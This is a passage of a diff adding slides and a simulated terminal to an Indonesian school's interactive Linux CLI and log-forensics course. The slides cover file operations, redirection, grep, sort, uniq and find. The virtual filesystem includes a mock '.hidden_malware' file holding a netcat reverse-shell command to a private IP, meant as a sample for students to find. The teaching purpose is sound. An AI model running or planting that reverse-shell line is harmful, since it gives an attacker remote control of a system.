+        targetHint: "Buat folder penyimpanan barang bukti digital: mkdir evidence",
+        sesi: "SESI 2: OPERASI BERKAS & I/O"
+      },
+      {
+        cat: "MANIPULASI BERKAS",
+        title: "Menyalin Data Aman: Utilitas cp",
+        bullets: [
+          "<strong>cp (Copy):</strong> Menduplikasi berkas atau direktori ke lokasi baru.",
+          "Opsi <code>-r</code> (Recursive): Wajib disertakan jika target yang disalin adalah folder.",
+          "Opsi <code>-p</code> (Preserve): Mempertahankan pemilik, grup, izin, dan tanggal asli berkas.",
+          "Sangat krusial dalam forensik digital agar keaslian bukti tidak tercemar oleh timestamp baru."
+        ],
+        targetCmd: "cp target.txt evidence/",
+        targetHint: "Salin berkas target ke dalam folder evidence: cp target.txt evidence/",
+        sesi: "SESI 2: OPERASI BERKAS & I/O"
+      },
+      {
+        cat: "MANIPULASI BERKAS",
+        title: "Memindahkan & Rename: Utilitas mv",
+        bullets: [
+          "<strong>mv (Move):</strong> Memindahkan berkas atau direktori ke lokasi tujuan lain.",
+          "Juga berfungsi mengganti nama berkas (*Rename*) jika posisinya berada di folder yang sama.",
+          "Tidak memerlukan opsi rekursif (-r) saat memindahkan sebuah direktori.",
+          "Hati-hati: Secara bawaan perintah ini akan menimpa berkas tujuan tanpa konfirmasi."
+        ],
+        targetCmd: "mv target.txt evidence/target_bak.txt",
+        targetHint: "Pindahkan dan ganti nama berkas: mv target.txt evidence/target_bak.txt",
+        sesi: "SESI 2: OPERASI BERKAS & I/O"
+      },
+      {
+        cat: "MANIPULASI BERKAS",
+        title: "Penghapusan Permanen: Utilitas rm",
+        bullets: [
+          "Linux **TIDAK MENYEDIAKAN RECYCLE BIN** di tingkat baris perintah CLI!",
+          "Berkas yang dihapus via rm langsung dicabut dari Inode dan sangat sulit dipulihkan.",
+          "Opsi <code>-r</code> : Menghapus folder beserta seluruh isinya secara rekursif.",
+          "Opsi <code>-f</code> (Force): Menghapus paksa tanpa konfirmasi dan mengabaikan pesan galat."
+        ],
+        targetCmd: "rm evidence/target_bak.txt",
+        targetHint: "Hapus berkas simulasi menggunakan perintah rm: rm evidence/target_bak.txt",
+        sesi: "SESI 2: OPERASI BERKAS & I/O"
+      },
+      {
+        cat: "INSPEKSI KONTEN",
+        title: "Membaca Isi Berkas: cat, less, tail",
+        bullets: [
+          "<strong>cat:</strong> Menumpahkan seluruh teks langsung ke layar terminal.",
+          "<strong>less:</strong> Membuka teks dalam mode baca interaktif halaman per halaman.",
+          "<strong>head -n 10:</strong> Membaca 10 baris pertama di awal berkas.",
+          "<strong>tail -n 10:</strong> Membaca 10 baris terakhir di ujung berkas (paling sering untuk log)."
+        ],
+        targetCmd: "cat /var/log/auth.log",
+        targetHint: "Baca seluruh isi berkas log autentikasi: cat /var/log/auth.log",
+        sesi: "SESI 2: OPERASI BERKAS & I/O"
+      },
+      {
+        cat: "INSPEKSI KONTEN",
+        title: "Memfilter Baris Terakhir: tail",
+        bullets: [
+          "Sebagian besar berkas log server berukuran raksasa hingga ratusan megabyte.",
+          "Membuka dengan perintah `cat` akan membanjiri buffer memori konsol Anda.",
+          "Utilitas <code>tail</code> membatasi pembacaan hanya pada peristiwa paling mutakhir.",
+          "Parameter <code>-f</code> (Follow) memantau pertambahan baris secara *real-time*."
+        ],
+        targetCmd: "tail -n 2 /var/log/auth.log",
+        targetHint: "Tampilkan 2 baris peristiwa paling akhir: tail -n 2 /var/log/auth.log",
+        sesi: "SESI 2: OPERASI BERKAS & I/O"
+      },
+      {
+        cat: "ALIRAN DATA",
+        title: "Tiga Jalur Data Standar (Standard Streams)",
+        bullets: [
+          "<strong>stdin (FD 0):</strong> Aliran masukan, standarnya keyboard perangkat.",
+          "<strong>stdout (FD 1):</strong> Aliran keluaran sukses, standarnya layar monitor.",
+          "<strong>stderr (FD 2):</strong> Aliran keluaran pesan error, standarnya layar monitor.",
+          "Ketiganya dapat dialihkan ke berkas menggunakan operator Redirection."
+        ],
+        targetCmd: "echo \"Uji Aliran Output\"",
+        targetHint: "Cetak teks pengujian ke aliran stdout: echo \"Uji Aliran Output\"",
+        sesi: "SESI 2: OPERASI BERKAS & I/O"
+      },
+      {
+        cat: "OPERATOR REDIRECTION",
+        title: "Mengarahkan Output: Operator > (Overwrite)",
+        bullets: [
+          "Operator <code>></code> mengarahkan output program langsung ke dalam berkas teks.",
+          "Perhatian: Operator ini akan <strong>menimpa seluruh isi file lama</strong>!",
+          "Jika file tujuan belum ada, sistem akan otomatis membuatnya.",
+          "Sangat berguna untuk menyimpan hasil scan terminal ke berkas laporan."
+        ],
+        targetCmd: "echo \"Kasus 01 Selesai\" > status.txt",
+        targetHint: "Tulis status baru ke file: echo \"Kasus 01 Selesai\" > status.txt",
+        sesi: "SESI 2: OPERASI BERKAS & I/O"
+      },
+      {
+        cat: "OPERATOR REDIRECTION",
+        title: "Menambah Data: Operator >> (Append)",
+        bullets: [
+          "Operator <code>>></code> menambahkan teks baru di baris paling bawah berkas.",
+          "Isi lama file **TIDAK AKAN TERHAPUS**.",
+          "Wajib digunakan saat mencatat aktivitas pemantauan log secara berulang.",
+          "Mencegah hilangnya rekaman insiden sebelumnya."
+        ],
+        targetCmd: "echo \"Kasus 02 Dibuka\" >> status.txt",
+        targetHint: "Tambahkan log baru tanpa menghapus isi lama: echo \"Kasus 02 Dibuka\" >> status.txt",
+        sesi: "SESI 2: OPERASI BERKAS & I/O"
+      },
+      {
+        cat: "OPERATOR REDIRECTION",
+        title: "Membuang Pesan Galat: 2> /dev/null",
+        bullets: [
+          "Kita sering kali perlu menyimpan hasil temuan dan membuang galat 'Permission denied'.",
+          "<code>2></code> : Mengalihkan pesan galat khusus (stderr).",
+          "<code>2> /dev/null</code> : Membuang seluruh pesan error ke dalam lubang hitam sistem.",
+          "Menjaga tampilan layar tetap bersih dan fokus pada bukti yang ditemukan."
+        ],
+        targetCmd: "cat status.txt 2> /dev/null",
+        targetHint: "Baca file dan buang error jika ada: cat status.txt 2> /dev/null",
+        sesi: "SESI 2: OPERASI BERKAS & I/O"
+      },
+      {
+        cat: "RANTAI PERINTAH",
+        title: "Konsep Sakti: Linux Pipeline ( | )",
+        bullets: [
+          "Simbol pipa garis tegak ( <code>|</code> ) menyalurkan keluaran program A ke masukan program B.",
+          "Mengizinkan perangkaian perkakas kecil menjadi instrumen analisis berkekuatan tinggi.",
+          "Data diproses langsung di memori RAM tanpa perlu membuat berkas temporer di hard disk.",
+          "Merupakan teknik dasar pembuatan perintah *one-liner* analis keamanan siber."
+        ],
+        targetCmd: "cat status.txt | grep Kasus",
+        targetHint: "Alirkan pembacaan teks status lalu filter dengan kata Kasus: cat status.txt | grep Kasus",
+        sesi: "SESI 2: OPERASI BERKAS & I/O"
+      },
+      {
+        cat: "OPERATOR LOGIKA",
+        title: "Eksekusi Bersyarat: Operator &&",
+        bullets: [
+          "Perintah kedua hanya akan dijalankan jika perintah pertama berhasil (Exit Code 0).",
+          "Mencegah kesalahan eksekusi beruntun jika langkah awal gagal.",
+          "Sering dipakai pada instalasi paket: <code>apt update && apt upgrade</code>.",
+          "Meningkatkan keandalan skrip otomasi administrasi server."
+        ],
+        targetCmd: "pwd && whoami",
+        targetHint: "Jalankan dua perintah sukses berurutan: pwd && whoami",
+        sesi: "SESI 2: OPERASI BERKAS & I/O"
+      },
+      {
+        cat: "OPERATOR LOGIKA",
+        title: "Penanganan Kegagalan: Operator ||",
+        bullets: [
+          "Perintah kedua hanya akan dijalankan jika perintah pertama **GAGAL**.",
+          "Berfungsi sebagai mekanisme *fallback* atau pelaporan kegagalan otomatis.",
+          "Sering dipakai pada uji konektivitas: `ping -c 1 host || echo Down`.",
+          "Mencegah skrip berhenti tanpa memberikan peringatan kegagalan."
+        ],
+        targetCmd: "cd /folder_palsu || echo \"Gagal masuk!\"",
+        targetHint: "Uji logika kegagalan dengan: cd /folder_palsu || echo \"Gagal masuk!\"",
+        sesi: "SESI 2: OPERASI BERKAS & I/O"
+      },
+      {
+        cat: "PRAKTIK LAB SESI 2",
+        title: "Lab 2: Redirection & Perangkaian Pipeline",
+        bullets: [
+          "Buat direktori baru bernama <code>evidence</code>.",
+          "Salin berkas <code>status.txt</code> ke dalam direktori tersebut.",
+          "Tambahkan baris stempel waktu menggunakan operator append <code>>></code>.",
+          "Gunakan pipa untuk menyaring baris yang mengandung angka 01."
+        ],
+        targetCmd: "cat status.txt | grep 01",
+        targetHint: "Saring baris yang memiliki angka 01 dengan: cat status.txt | grep 01",
+        sesi: "SESI 2: OPERASI BERKAS & I/O"
+      },
+      {
+        cat: "EVALUASI SESI 2",
+        title: "Cek Pemahaman: Aliran Stream I/O",
+        bullets: [
+          "<strong>Pertanyaan 1:</strong> Operator apa yang dipakai untuk menambah data tanpa menimpa file lama?",
+          "<strong>Pertanyaan 2:</strong> Angka deskriptor apa yang mewakili saluran Standard Error (stderr)?",
+          "<strong>Pertanyaan 3:</strong> Apakah berkas yang dihapus lewat perintah `rm` masuk ke Recycle Bin?"
+        ],
+        targetCmd: "echo \">> adalah append\"",
+        targetHint: "Jawab pertanyaan 1 dengan mencetak teks: echo \">> adalah append\"",
+        sesi: "SESI 2: OPERASI BERKAS & I/O"
+      },
+      {
+        cat: "RINGKASAN SESI 2",
+        title: "Rangkuman Kunci Operasi Berkas & I/O",
+        bullets: [
+          "Perintah `rm -rf` bekerja permanen tanpa mekanisme tempat penampungan sampah.",
+          "Tiga stream I/O standar (0, 1, 2) memberi kontrol penuh ke mana teks dialirkan.",
+          "Pipeline ( | ) mengalirkan hasil proses langsung di memori RAM secara efisien.",
+          "Gunakan `2> /dev/null` untuk membersihkan layar dari galat penolakan hak akses."
+        ],
+        targetCmd: "clear",
+        targetHint: "Bersihkan layar terminal Anda untuk melanjutkan ke Sesi 3: clear",
+        sesi: "SESI 2: OPERASI BERKAS & I/O"
+      },
+
+      // SESI 3: FILTER TEKS & FORENSIK LOG
+      {
+        cat: "PENGANTAR SESI 3",
+        title: "Filter Teks, Pencarian & Investigasi Log",
+        bullets: [
+          "Serangan siber selalu meninggalkan artefak berupa deretan catatan di berkas log sistem.",
+          "Membaca jutaan baris rekaman secara manual mustahil dilakukan oleh manusia.",
+          "Kita membutuhkan instrumen penyaring: <strong>grep</strong>, <strong>sort</strong>, <strong>uniq</strong>, dan <strong>find</strong>.",
+          "Fokus pada teknik ekstraksi indikator kompromi (*Indicator of Compromise - IoC*)."
+        ],
+        targetCmd: "grep \"Failed password\" /var/log/auth.log",
+        targetHint: "Cari baris percobaan login gagal: grep \"Failed password\" /var/log/auth.log",
+        sesi: "SESI 3: FILTER TEKS & FORENSIK"
+      },
+      {
+        cat: "PENYARING TEKS",
+        title: "Pisau Bedah Log: Utilitas grep",
+        bullets: [
+          "<strong>grep (Global Regular Expression Print):</strong> Menyaring teks berdasarkan kecocokan pola.",
+          "Mencetak seluruh baris yang mengandung pola yang dicari langsung ke layar terminal.",
+          "Alat paling penting bagi analis SOC untuk melacak anomali intrusi pada server.",
+          "Dapat memeriksa berkas tunggal, banyak folder, atau menerima data dari pipa aliran."
+        ],
+        targetCmd: "grep \"Accepted\" /var/log/auth.log",
+        targetHint: "Cari sesi login yang berhasil: grep \"Accepted\" /var/log/auth.log",
+        sesi: "SESI 3: FILTER TEKS & FORENSIK"
+      },
+      {
+        cat: "PENYARING TEKS",
+        title: "Kombinasi Parameter Sakti grep: -i",
+        bullets: [
+          "<code>-i</code> (Ignore Case): Mengabaikan perbedaan huruf besar dan huruf kecil.",
+          "Sangat berguna jika penyerang menyamarkan perintah (misal `root`, `Root`, `ROOT`).",
+          "Mencegah hilangnya bukti penting hanya karena ketidakcocokan kapitalisasi.",
+          "Standar awal saat melakukan penelusuran kata kunci yang belum pasti."
+        ],
+        targetCmd: "grep -i \"failed\" /var/log/auth.log",
+        targetHint: "Gunakan grep abaikan huruf besar-kecil: grep -i \"failed\" /var/log/auth.log",
+        sesi: "SESI 3: FILTER TEKS & FORENSIK"
+      },
+      {
+        cat: "PENYARING TEKS",
+        title: "Membalikkan Pencarian: grep -v",
+        bullets: [
+          "Parameter <code>-v</code> (Invert Match) menampilkan baris yang **TIDAK MENGANDUNG** kata kunci.",
+          "Sangat efektif untuk membuang baris yang tidak penting atau aktivitas rutin yang sudah diketahui sah.",
+          "Membantu analis memangkas ribuan baris log normal agar sisa anomali dapat terlihat jelas.",
+          "Sering dirangkai berkali-kali untuk mempersempit hasil investigasi."
+        ],
+        targetCmd: "grep -v \"root\" /var/log/auth.log",
+        targetHint: "Tampilkan log login selain akun root: grep -v \"root\" /var/log/auth.log",
+        sesi: "SESI 3: FILTER TEKS & FORENSIK"
+      },
+      {
+        cat: "PENYARING TEKS",
+        title: "Menghitung Jumlah Temuan: grep -c",
+        bullets: [
+          "Parameter <code>-c</code> (Count) mencetak jumlah total baris yang cocok tanpa menumpahkan teksnya.",
+          "Sangat cepat untuk mengukur skala serangan (misal: berapa ribu percobaan login terjadi).",
+          "Menghindari terminal mengalami hang saat memindai log bernilai jutaan baris.",
+          "Memberikan metrik kuantitatif awal sebelum dilakukan pembedahan lebih dalam."
+        ],
+        targetCmd: "grep -c \"Failed\" /var/log/auth.log",
+        targetHint: "Hitung jumlah percobaan login gagal: grep -c \"Failed\" /var/log/auth.log",
+        sesi: "SESI 3: FILTER TEKS & FORENSIK"
+      },
+      {
+        cat: "POLA REGEX",
+        title: "Pencocokan Pola Awal Baris: Karakter ^",
+        bullets: [
+          "RegEx (Regular Expression) adalah bahasa pola teks tingkat lanjut.",
+          "Karakter sisipan <code>^</code> (Caret) mencocokkan teks yang berada persis di **awal baris**.",
+          "Menghindari kecocokan palsu jika kata kunci muncul di tengah pesan teks.",
+          "Sering dipakai untuk menyaring baris komentar pada berkas konfigurasi."
+        ],
+        targetCmd: "grep \"^Sep\" /var/log/auth.log",
+        targetHint: "Cari log yang diawali bulan September (Sep): grep \"^Sep\" /var/log/auth.log",
+        sesi: "SESI 3: FILTER TEKS & FORENSIK"
+      },
+      {
+        cat: "POLA REGEX",
+        title: "Pencocokan Pola Akhir Baris: Karakter $",
+        bullets: [
+          "Karakter <code>$</code> (Dollar) mencocokkan teks yang berada di **ujung akhir baris**.",
+          "Sangat berguna untuk mencari pengguna yang memiliki shell tertentu di `/etc/passwd`.",
+          "Kombinasi <code>^$</code> digunakan untuk mendeteksi baris kosong.",
+          "Membuat pemfilteran teks menjadi sangat presisi dan akurat."
+        ],
+        targetCmd: "grep \"51200$\" /var/log/auth.log",
+        targetHint: "Cari baris yang diakhiri port 51200: grep \"51200$\" /var/log/auth.log",
+        sesi: "SESI 3: FILTER TEKS & FORENSIK"
+      },
+      {
+        cat: "PENGURUTAN DATA",
+        title: "Mengurutkan Data Temuan: sort",
+        bullets: [
+          "Perintah <code>sort</code> menyusun baris teks secara alfabetis atau numerik (<code>-n</code>).",
+          "Opsi <code>-r</code> membalikkan urutan dari yang terbesar ke yang terkecil (*Reverse*).",
+          "Merupakan langkah wajib sebelum data diproses oleh utilitas penghapus duplikat `uniq`.",
+          "Mempermudah pembacaan daftar IP atau nama pengguna penyerang."
+        ],
+        targetCmd: "cat status.txt | sort",
+        targetHint: "Urutkan baris file status secara alfabetis: cat status.txt | sort",
+        sesi: "SESI 3: FILTER TEKS & FORENSIK"
+      },
+      {
+        cat: "AGREGASI DATA",
+        title: "Menghitung Frekuensi Serangan: uniq -c",
+        bullets: [
+          "Perintah <code>uniq</code> menghapus baris duplikat yang posisinya saling berurutan.",
+          "Parameter <code>-c</code> (Count) menghitung berapa kali tiap baris yang sama muncul.",
+          "Kombinasi <code>sort | uniq -c | sort -nr</code> adalah rumus emas analisis log siber.",
+          "Baris paling atas langsung menunjukkan pelaku atau IP penyerang paling agresif!"
+        ],
+        targetCmd: "cat status.txt | sort | uniq -c",
+        targetHint: "Hitung frekuensi baris unik pada berkas status: cat status.txt | sort | uniq -c",
+        sesi: "SESI 3: FILTER TEKS & FORENSIK"
+      },
+      {
+        cat: "EKSTRAKSI KOLOM",
+        title: "Mengambil Kolom Tertentu: cut",
+        bullets: [
+          "Log server tersusun dalam format tabel kolom berpemisah (delimiter).",
+          "Parameter <code>-d</code> menentukan karakter pemisah (misal spasi atau titik dua).",
+          "Parameter <code>-f</code> menentukan nomor kolom data yang ingin diisolasi.",
+          "Sangat cepat untuk memisahkan daftar alamat IP murni dari teks log yang panjang."
+        ],
+        targetCmd: "cut -d' ' -f1 status.txt",
+        targetHint: "Ambil kolom pertama dengan pemisah spasi: cut -d' ' -f1 status.txt",
+        sesi: "SESI 3: FILTER TEKS & FORENSIK"
+      },
+      {
+        cat: "PELACAKAN BERKAS",
+        title: "Perburuan Berkas Forensik: find",
+        bullets: [
+          "Jika grep mencari *isi* berkas, utilitas <code>find</code> melacak *objek berkas* di disk.",
+          "Mampu mencari berdasarkan nama (<code>-name</code>), tipe (<code>-type f/d</code>), dan ukuran.",
+          "Menyusuri seluruh partisi hard disk secara rekursif hingga ke sub-folder terdalam.",
+          "Instrumen wajib saat mencari lokasi instalasi malware atau skrip web shell."
+        ],
+        targetCmd: "find . -name \"*.txt\"",
+        targetHint: "Cari semua berkas berakhiran .txt di direktori aktif: find . -name \"*.txt\"",
+        sesi: "SESI 3: FILTER TEKS & FORENSIK"
+      },
+      {
+        cat: "PELACAKAN WAKTU",
+        title: "Melacak Berkas Berdasarkan Waktu Modifikasi",
+        bullets: [
+          "Parameter <code>-mtime -1</code> menemukan berkas yang diubah dalam 24 jam terakhir.",
+          "Parameter <code>-mmin -30</code> menemukan berkas yang diubah dalam 30 menit terakhir.",
+          "Krusial untuk mengidentifikasi berkas apa saja yang disentuh peretas saat insiden baru terjadi.",
+          "Menyempitkan ruang investigasi secara dramatis."
+        ],
+        targetCmd: "find . -type f",
+        targetHint: "Tampilkan seluruh berkas biasa di folder saat ini: find . -type f",
+        sesi: "SESI 3: FILTER TEKS & FORENSIK"
+      },
+      {
+        cat: "STUDI KASUS NYATA",
+        title: "Investigasi Forensik: Mengungkap IP Brute Force",
+        bullets: [
+          "Skenario: Server diserang percobaan login SSH berkali-kali.",
+          "Langkah 1: Saring baris yang memuat 'Failed password'.",
+          "Langkah 2: Ambil kolom alamat IP penyerang.",
+          "Langkah 3: Hitung frekuensi tiap IP untuk mendapatkan target pemblokiran firewall."
+        ],
+        targetCmd: "grep \"Failed password\" /var/log/auth.log",
+        targetHint: "Buka data bukti serangan brute force: grep \"Failed password\" /var/log/auth.log",
+        sesi: "SESI 3: FILTER TEKS & FORENSIK"
+      },
+      {
+        cat: "PRAKTIK LAB SESI 3",
+        title: "Lab 3: Rangkaian Analisis Threat Hunting",
+        bullets: [
+          "Lakukan pencarian terhadap seluruh log autentikasi yang berhasil (*Accepted*).",
+          "Identifikasi user siapa yang berhasil login dan dari alamat IP mana.",
+          "Pastikan tidak ada akun asing yang berhasil memperoleh akses ke server.",
+          "Dokumentasikan temuan bukti digital untuk laporan insiden keamanan."
+        ],
+        targetCmd: "grep \"Accepted\" /var/log/auth.log",
+        targetHint: "Periksa bukti login yang berhasil: grep \"Accepted\" /var/log/auth.log",
+        sesi: "SESI 3: FILTER TEKS & FORENSIK"
+      },
+      {
+        cat: "RANGKUMAN FINAL",
+        title: "Rangkuman Menyeluruh Sub-Bab 1.2",
+        bullets: [
+          "CLI adalah instrumen berdaya tinggi untuk administrasi dan analisis forensik siber.",
+          "Operator redirection (> , >>, 2>) mengendalikan pencatatan dan peredaman pesan error.",
+          "Pipeline ( | ) memungkinkan pengolahan data multi-tahap secara efisien langsung di RAM.",
+          "Kombinasi `grep`, `awk`, `sort`, `uniq`, dan `find` membentuk fondasi utama digital forensik."
+        ],
+        targetCmd: "echo \"Sub-Bab 1.2 Berhasil Dikuasai!\"",
+        targetHint: "Rayakan ketuntasan materi dengan: echo \"Sub-Bab 1.2 Berhasil Dikuasai!\"",
+        sesi: "SESI 3: FILTER TEKS & FORENSIK"
+      },
+      // SLIDE 50: SLIDE PENUTUP & KONTAK RESMI
+      {
+        isOutro: true,
+        title: "Terima Kasih & Tetap Semangat Belajar!",
+        quote: "“Keahlian baris perintah (CLI) bukan sekadar tentang mengetik cepat, melainkan tentang ketepatan berpikir, disiplin logika, dan seni menjaga kedaulatan data sistem.”",
+        email: "tkj@smkwikrama.sch.id",
+        instagram: "@tkjwikrama74",
+        website: "www.smkwikrama.sch.id",
+        sesi: "PENUTUP & KONTAK"
+      }
+    ];
+
+    let currentSlide = 0;
+    const totalSlides = slidesData.length;
+    const deck = document.getElementById("deck");
+    const slideNum = document.getElementById("slide-num");
+    const sessionTag = document.getElementById("session-tag");
+    const thumbList = document.getElementById("thumb-list");
+    const sidebarOverlay = document.getElementById("sidebar-overlay");
+    const slideSidebar = document.getElementById("slide-sidebar");
+
+    // Simulasi Virtual Filesystem & Log
+    const virtualFS = {
+      "~": [".bashrc", ".bash_history", ".hidden_malware", "documents", "downloads", "status.txt", "target.txt"],
+      "/var/log": ["auth.log", "syslog", "nginx", "dpkg.log"],
+      "evidence": ["target.txt"]
+    };
+
+    const virtualFiles = {
+      ".hidden_malware": "# MALWARE SAMPLE DETECTED\n#!/bin/bash\nnc -e /bin/bash 192.168.1.100 4444",
+      "/var/log/auth.log": "Sep 21 10:12:01 srv sshd[1204]: Failed password for root from 192.168.1.105 port 44210\nSep 21 10:12:05 srv sshd[1205]: Failed password for root from 192.168.1.105 port 44212\nSep 21 10:14:02 srv sshd[1210]: Failed password for admin from 192.168.1.105 port 44214\nSep 21 10:15:20 srv sshd[1220]: Accepted password for siswa from 192.168.1.50 port 51200",
+      "status.txt": "Kasus 01 Selesai\nKasus 02 Dibuka",
+      "target.txt": "Data konfigurasi server rahasia."
+    };
+
+    // Render Thumbnail Drawer
+    function renderThumbnails() {
+      thumbList.innerHTML = "";
+      slidesData.forEach((slide, idx) => {
+        const thumb = document.createElement("div");
+        thumb.className = "thumb-card" + (idx === currentSlide ? " active" : "");
+        thumb.id = `thumb-${idx}`;
+        thumb.onclick = () => {
+          goToSlide(idx);
+          toggleSidebar();
+        };
+
+        const tagText = slide.isCover ? "COVER" : (slide.isOutro ? "PENUTUP" : (slide.cat || "MATERI"));
+        const titleText = slide.title || `Slide #${idx + 1}`;
+
+        thumb.innerHTML = `
+          <div class="thumb-top-row">
+            <span class="thumb-num">#${String(idx + 1).padStart(2, '0')}</span>
+            <span class="thumb-tag">${tagText}</span>
+          </div>
+          <div class="thumb-title">${titleText}</div>
+        `;
+        thumbList.appendChild(thumb);
+      });
+    }
+
+    function filterThumbnails() {
+      const q = document.getElementById("sidebar-filter").value.toLowerCase();
+      slidesData.forEach((slide, idx) => {
+        const el = document.getElementById(`thumb-${idx}`);
+        const textToSearch = `${idx + 1} ${slide.title || ""} ${slide.cat || ""} ${slide.subtitle || ""}`.toLowerCase();
+        if (textToSearch.includes(q)) {
+          el.style.display = "flex";
+        } else {
+          el.style.display = "none";
+        }
+      });
+    }
+
+    function toggleSidebar() {
+      const isOpen = slideSidebar.classList.contains("open");
+      if (isOpen) {
+        slideSidebar.classList.remove("open");
+        sidebarOverlay.classList.remove("open");
+      } else {
+        slideSidebar.classList.add("open");
+        sidebarOverlay.classList.add("open");
+        const activeThumb = document.getElementById(`thumb-${currentSlide}`);
+        if (activeThumb) {
+          activeThumb.scrollIntoView({ block: "center", behavior: "smooth" });
+        }
+        document.getElementById("sidebar-filter").focus();
+      }
+    }
+
+    function renderDeck() {
+      deck.innerHTML = "";
+      slidesData.forEach((slide, idx) => {
+        const card = document.createElement("div");
+        card.className = "slide-card" + (idx === currentSlide ? " active" : "") 
+          + (slide.isCover ? " cover-card" : "")
+          + (slide.isOutro ? " outro-card" : "");
+
+        if (slide.isCover) {
+          card.innerHTML = `
+            <div class="cover-top-header">
+              <div class="cover-program">${slide.program}</div>
+              <div class="cover-subprogram">${slide.subprogram}</div>
+              <div class="cover-chapter-badge">${slide.chapter}</div>
+            </div>
+
+            <div class="cover-main-hero">
+              <h1 class="cover-title">${slide.title}</h1>
+              <p class="cover-subtitle">${slide.subtitle}</p>
+            </div>
+            
+            <div class="terminal-container" style="max-width: 680px; width: 100%; height: 200px; min-height: 200px;">
+              <div class="terminal-header-bar">
+                <div class="terminal-dots">
+                  <span class="dot dot-red"></span>
+                  <span class="dot dot-yellow"></span>
+                  <span class="dot dot-green"></span>
+                </div>
+                <div class="terminal-tab-title">bash — siswa@wikrama-lab:~</div>
+                <span class="challenge-status status-success">Interactive Engine Ready</span>
+              </div>
+              <div class="terminal-screen" style="font-size: 0.8rem;">
+                <div><span class="term-prompt">siswa@wikrama-lab</span>:<span class="term-path">~</span><span class="term-char">$</span> ${slide.terminalCmd}</div>
+                <div class="term-output" style="color:#a7f3d0;">${slide.terminalOut}</div>
+                <div style="margin-top: 8px; color: #94a3b8;">💡 <em>Klik tombol "☰ Daftar Slide" di kiri atas untuk melompat ke 50 materi slide lainnya!</em></div>
+              </div>
+            </div>
+
+            <div class="cover-bottom-bar">
+              <div class="teacher-card">
+                <div class="teacher-avatar">👨‍🏫</div>
+                <div>
+                  <div class="teacher-name">Guru Pengampu: ${slide.teacher}</div>
+                  <div class="teacher-certs">${slide.certs}</div>
+                </div>
+              </div>
+              <div class="meta-pills">
+                <span class="meta-pill-item">📅 ${slide.meta1}</span>
+                <span class="meta-pill-item">📊 ${slide.meta2}</span>
+              </div>
+            </div>
+          `;
+        } else if (slide.isOutro) {
+          card.innerHTML = `
+            <h1 class="outro-title">${slide.title}</h1>
+            <p class="outro-quote">${slide.quote}</p>
+            
+            <div class="contact-grid">
+              <div class="contact-card">
+                <div class="contact-icon">✉️</div>
+                <div class="contact-label">Email Kejuruan</div>
+                <div class="contact-val">${slide.email}</div>
+              </div>
+              <div class="contact-card">
+                <div class="contact-icon">📸</div>
+                <div class="contact-label">Instagram TKJ</div>
+                <div class="contact-val">${slide.instagram}</div>
+              </div>
+              <div class="contact-card">
+                <div class="contact-icon">🌐</div>
+                <div class="contact-label">Portal Sekolah</div>
+                <div class="contact-val">${slide.website}</div>
+              </div>
+            </div>
+
+            <div class="meta-pill-item" style="background: rgba(0,0,0,0.4); border: 1px solid rgba(255,255,255,0.15); padding: 8px 18px; border-radius: 8px; color: #cbd5e1; font-size: 0.85rem; margin-top: 10px;">
+              <span>🛡️ Laboratorium Jaringan Komputer & Keamanan Siber — SMK Wikrama Kota Bogor</span>
+            </div>
+          `;
+        } else {
+          let bulletsHtml = slide.bullets.map(b => `<li>${b}</li>`).join("");
+
+          card.innerHTML = `
+            <div class="slide-header">
+              <div class="slide-category">${slide.cat}</div>
+              <h2 class="slide-title">${slide.title}</h2>
+            </div>
+            <div class="slide-body">
+              <div class="text-content">
+                <ul>${bulletsHtml}</ul>
+                <div style="margin-top: 14px; background: #eff6ff; border: 1px solid #bfdbfe; border-radius: 8px; padding: 12px; font-size: 0.95rem;">
+                  <strong style="color: #1e40af;">🎯 Tantangan Praktik Slide Ini:</strong><br>
+                  <span style="color: #1e3a8a;">${slide.targetHint || "Ketik perintah di terminal interaktif sebelah kanan."}</span>
+                </div>
+              </div>
+
+              <!-- Terminal Ubuntu Simulasi Interaktif -->
+              <div class="terminal-container">
+                <div class="terminal-header-bar">
+                  <div class="terminal-dots">
+                    <span class="dot dot-red"></span>
+                    <span class="dot dot-yellow"></span>
+                    <span class="dot dot-green"></span>
+                  </div>
+                  <div class="terminal-tab-title">bash — siswa@wikrama-lab:${currentDir}</div>
+                  <span class="challenge-status status-pending" id="status-badge-${idx}">Tantangan Belum Dicoba</span>
+                </div>
+                
+                <div class="terminal-screen" id="term-screen-${idx}" onclick="focusTerminalInput(${idx})">
+                  <div class="history-entry">
+                    <span style="color: #64748b;"># Ubuntu Bash Interactive Terminal Lab</span><br>
+                    <span style="color: #64748b;"># Jalankan perintah Linux sesuai materi dan perhatikan hasilnya.</span>
+                  </div>
+                  <div id="cmd-history-output-${idx}"></div>
+                  
+                  <div class="terminal-input-row">
+                    <span class="term-prompt">siswa@wikrama-lab</span>:<span class="term-path">${currentDir}</span><span class="term-char">$</span>
+                    <input type="text" class="term-input" id="term-input-${idx}" autocomplete="off" spellcheck="false" 
+                      onkeydown="handleTerminalInput(event, ${idx}, '${slide.targetCmd || ""}')" />
+                  </div>
+                </div>
+
+                <div class="terminal-footer-hint">
+                  <span>Target: <code style="color: #38bdf8;">${slide.targetCmd || "Bebas Eksplorasi"}</code></span>
+                  ${slide.targetCmd ? `<button class="copy-btn" onclick="autoFillCmd(${idx}, '${slide.targetCmd}')">Salin ke Input</button>` : ""}
+                </div>
+              </div>
+            </div>
+          `;
+        }
+        deck.appendChild(card);
+      });
+      renderThumbnails();
+      updateMeta();
+    }
+
+    function updateMeta() {
+      slideNum.innerText = `Slide ${currentSlide + 1} of ${totalSlides}`;
+      sessionTag.innerText = slidesData[currentSlide].sesi;
+      
+      const cards = document.querySelectorAll(".slide-card");
+      cards.forEach((c, i) => c.classList.toggle("active", i === currentSlide));
+
+      const thumbs = document.querySelectorAll(".thumb-card");
+      thumbs.forEach((t, i) => t.classList.toggle("active", i === currentSlide));
+
+      setTimeout(() => {
+        focusTerminalInput(currentSlide);
+      }, 100);
+    }
+
+    function focusTerminalInput(slideIdx) {
+      const inp = document.getElementById(`term-input-${slideIdx}`);
+      if (inp) inp.focus();
+    }
+
+    function autoFillCmd(slideIdx, cmdText) {
+      const inp = document.getElementById(`term-input-${slideIdx}`);
+      if (inp) {
+        inp.value = cmdText;
+        inp.focus();
+      }
+    }
+
+    function goToSlide(index) {
+      if (index >= 0 && index < totalSlides) {
+        currentSlide = index;
+        updateMeta();
+      }
+    }
+
+    function nextSlide() {
+      if (currentSlide < totalSlides - 1) {
+        currentSlide++;
+        updateMeta();
+      }
+    }
+
+    function prevSlide() {
+      if (currentSlide > 0) {
